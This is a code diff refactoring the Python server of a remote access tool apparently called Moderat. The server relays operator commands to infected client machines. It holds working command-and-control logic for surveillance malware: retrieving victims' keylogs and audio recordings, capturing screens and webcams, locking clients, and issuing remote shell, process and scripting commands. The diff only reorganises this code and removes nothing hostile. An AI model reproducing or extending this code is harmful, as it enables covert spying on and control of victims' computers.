@@ -112,8 +112,6 @@ class ModeratServerProtocol(Protocol):
             elif command['from'] == 'moderator':
                 self.moderator_commands(command)
 
-
-
     def client_commands(self, payload, mode, session_id, key):
 
         # Clients Initializing
@@ -123,9 +121,8 @@ class ModeratServerProtocol(Protocol):
 
             # If client has no key generate new one and send
             if payload == 'noKey':
-                log.info('Generate New Key')
                 client_id = id_generator()
-
+                log.info('Generate New Key (%s)' % client_id)
                 self.send_message_to_client(self, client_id, 'clientInitializing')
 
             # else get key from client
@@ -321,26 +318,22 @@ class ModeratServerProtocol(Protocol):
             else:
                 self.send_message_to_moderator(self, 'noDataFound', 'noDataFound')
 
-        # TODO: Download Keylogs
         elif data['mode'] == 'downloadKeylogs':
             client_id, date, filter_downloaded = data['payload'].split()
-            if int(filter_downloaded) == 1:
-                keylogs_list = manageKeylogs.get_all_new_keylogs(client_id, date)
-            else:
-                keylogs_list = manageKeylogs.get_all_keylogs(client_id, date)
+            keylogs_list = manageKeylogs.get_all_new_keylogs(client_id, date) if int(filter_downloaded) == 1 else manageKeylogs.get_all_keylogs(client_id, date)
             if len(keylogs_list) > 0:
                 keylogs_names = []
                 for keylog in keylogs_list:
                     if os.path.exists(keylog[3]):
-                        self.keylogs_dict[keylog[1]] = {}
-                        self.keylogs_dict[keylog[1]]['datetime'] = keylog[1]
-                        self.keylogs_dict[keylog[1]]['date'] = keylog[2]
-                        self.keylogs_dict[keylog[1]]['raw'] = open(keylog[3], 'rb').read()
+                        self.keylogs_dict[keylog[1]] = {
+                            'datetime': keylog[1],
+                            'date':     keylog[2],
+                            'raw':      open(keylog[3], 'rb').read()
+                        }
                         keylogs_names.append(keylog[1])
                     else:
                         log.info('File Not Found Delete Entry (%s)' % keylog[3])
                         manageKeylogs.delete_keylog(keylog[1])
-                # Send Data Count
                 self.send_message_to_moderator(self, keylogs_names, len(keylogs_list))
             else:
                 self.send_message_to_moderator(self, 'noDataFound', 'noDataFound')
@@ -354,26 +347,22 @@ class ModeratServerProtocol(Protocol):
             else:
                 self.send_message_to_moderator(self, 'noDataFound', 'noDataFound')
 
-        # TODO: Download Audios
         elif data['mode'] == 'downloadAudios':
             client_id, date, filter_downloaded = data['payload'].split()
-            if int(filter_downloaded) == 1:
-                audios_list = manageAudio.get_all_new_audios(client_id, date)
-            else:
-                audios_list = manageAudio.get_all_audios(client_id, date)
+            audios_list = manageAudio.get_all_new_audios(client_id, date) if int(filter_downloaded) == 1 else manageAudio.get_all_audios(client_id, date)
             if len(audios_list) > 0:
                 audios_names = []
                 for audio in audios_list:
                     if os.path.exists(audio[3]):
-                        self.audio_dict[audio[1]] = {}
-                        self.audio_dict[audio[1]]['datetime'] = audio[1]
-                        self.audio_dict[audio[1]]['date'] = audio[2]
-                        self.audio_dict[audio[1]]['raw'] = open(audio[3], 'rb').read()
+                        self.audio_dict[audio[1]] = {
+                            'datetime': audio[1],
+                            'date':     audio[2],
+                            'raw':      open(audio[3], 'rb').read()
+                        }
                         audios_names.append(audio[1])
                     else:
                         log.info('File Not Found Delete Entry (%s)' % audio[3])
                         manageAudio.delete_audios(audio[1])
-                # Send Data Count
                 self.send_message_to_moderator(self, audios_names, len(audios_list))
             else:
                 self.send_message_to_moderator(self, 'noDataFound', 'noDataFound')
@@ -414,68 +403,43 @@ class ModeratServerProtocol(Protocol):
             manageClients.set_moderator(client_id, moderator_id)
             log.info('Moderator Changed For Client (%s) to (%s)' % (client_id, moderator_id))
 
-
-        # Filters
-        # Terminating Client
-        elif data['mode'] == 'terminateClient' and manageModerators.get_privs(moderators[data['session_id']]['username']) == 1:
+        # FILTERS
+        # For Only Administrators
+        elif data['mode'] in ['terminateClient',] and manageModerators.get_privs(moderators[data['session_id']]['username']) == 1:
             log.info('Send (%s) Message to %s from %s' % (data['mode'], data['to'], data['from']))
             self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
-        # Unlock Client
-        elif data['mode'] == 'unlockClient':
+        # For Moderators
+        elif data['mode'] in ['unlockClient', 'lockClient', 'lockClient', 'getScreen', 'getWebcam',
+                              'getWebcam', 'shellMode', 'processesMode', 'scriptingMode']:
             log.info('Send (%s) Message to %s from %s' % (data['mode'], data['to'], data['from']))
             self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
-        # Lock Client
-        elif data['mode'] == 'lockClient':
-            log.info('Send (%s) Message to %s from %s' % (data['mode'], data['to'], data['from']))
-            self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
-        # Desktop Screenshot
-        elif data['mode'] == 'getScreen':
-            log.info('Send (%s) Message to %s from %s' % (data['mode'], data['to'], data['from']))
-            self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
-        # Webcamera
-        elif data['mode'] == 'getWebcam':
-            log.info('Send (%s) Message to %s from %s' % (data['mode'], data['to'], data['from']))
-            self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
-        # Remote Shell
-        elif data['mode'] == 'shellMode':
-            log.info('Send (%s) Message to %s from %s' % (data['mode'], data['to'], data['from']))
-            self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
-        # Processes Manager
-        elif data['mode'] == 'processesMode':
-            log.info('Send (%s) Message to %s from %s' % (data['mode'], data['to'], data['from']))
-            self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
-        # Remote Scripting
-        elif data['mode'] == 'scriptingMode':
-            log.info('Send (%s) Message to %s from %s' % (data['mode'], data['to'], data['from']))
-            self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
-
         else:
             return
 
-    def is_administrator(self, session_id):
-        if manageModerators.get_privs(moderators[session_id]['username']) == 1:
-            return True
-        else:
-            return False
+    @staticmethod
+    def is_administrator(session_id):
+        return True if manageModerators.get_privs(moderators[session_id]['username']) == 1 else False
 
-    def send_message_to_client(self, client, message, mode, _from='server', session_id='', end='[ENDOFMESSAGE]'):
+    # Send Message To Client
+    @staticmethod
+    def send_message_to_client(client, message, mode, _from='server', session_id='', end='[ENDOFMESSAGE]'):
         # Send Data Function
-        message = {
+        client.transport.write(str({
             'payload': message,
             'mode': mode,
             'from': _from,
             'session_id': session_id,
-        }
-        client.transport.write(str(message)+end)
+        })+end)
 
-    def send_message_to_moderator(self, moderator, message, mode, _from='server', end='[ENDOFMESSAGE]'):
-        message = {
+    # Send Message To Moderator
+    @staticmethod
+    def send_message_to_moderator(moderator, message, mode, _from='server', end='[ENDOFMESSAGE]'):
+        moderator.transport.write(str({
             'payload': message,
             'mode': mode,
             'from': _from,
             'to': '',
-        }
-        moderator.transport.write(str(message)+end)
+        })+end)
 
 
 class ModeratServerFactory(ServerFactory):
